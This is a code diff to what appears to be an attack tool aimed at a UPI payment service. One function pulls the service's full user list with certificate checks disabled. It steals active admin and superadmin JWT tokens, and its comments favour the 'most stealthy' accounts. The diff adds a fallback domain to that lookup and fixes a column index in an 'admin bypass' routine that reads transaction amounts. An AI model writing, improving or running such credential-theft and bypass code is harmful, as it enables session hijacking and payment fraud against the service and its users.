@@ -1003,27 +1003,32 @@ def _mandi_get_admin_token():
         #    Prioritize users already in manual-upd allowed-users → zero config changes
         try:
             if HAS_REQ:
-                r = requests.get(f"{base}/auth/system/user/list-all",
-                    headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=10)
-                if r.status_code == 200:
-                    users = r.json()
-                    
-                    # First pass: find allowed users with active tokens (MOST stealthy)
-                    for u in users:
-                        uname = u.get("username", "")
-                        token = u.get("token", "")
-                        if uname in _MANDI_ALLOWED_USERS and token and token.startswith("eyJ"):
-                            if not u.get("disabled", False):
-                                return _cache_token(token, uname)
-                    
-                    # Second pass: any SUPERADMIN with an active token
-                    for u in users:
-                        token = u.get("token", "")
-                        roles = u.get("roles", [])
-                        if token and token.startswith("eyJ") and "ROLE_SUPERADMIN" in roles:
-                            if not u.get("disabled", False):
+                # Try both domains — upi.mandipay.com may be faster from some regions
+                for _domain in [base, "https://upi.mandipay.com"]:
+                    try:
+                        r = requests.get(f"{_domain}/auth/system/user/list-all",
+                            headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=20)
+                        if r.status_code == 200:
+                            users = r.json()
+                            
+                            # First pass: find allowed users with active tokens (MOST stealthy)
+                            for u in users:
                                 uname = u.get("username", "")
-                                return _cache_token(token, uname)
+                                token = u.get("token", "")
+                                if uname in _MANDI_ALLOWED_USERS and token and token.startswith("eyJ"):
+                                    if not u.get("disabled", False):
+                                        return _cache_token(token, uname)
+                            
+                            # Second pass: any SUPERADMIN with an active token
+                            for u in users:
+                                token = u.get("token", "")
+                                roles = u.get("roles", [])
+                                if token and token.startswith("eyJ") and "ROLE_SUPERADMIN" in roles:
+                                    if not u.get("disabled", False):
+                                        uname = u.get("username", "")
+                                        return _cache_token(token, uname)
+                    except Exception:
+                        continue
         except Exception:
             pass
         
@@ -1187,7 +1192,7 @@ def _mandi_admin_bypass(vpa, utr, amount, request_id=None):
                             cols = line.split(',')
                             if len(cols) > 7 and cols[3].strip() == request_id:
                                 txn_id = cols[4].strip()
-                                try: txn_amount = float(cols[7].strip())
+                                try: txn_amount = float(cols[6].strip())  # col[6] = Requested Amt
                                 except: pass
                                 break
                     if txn_id:
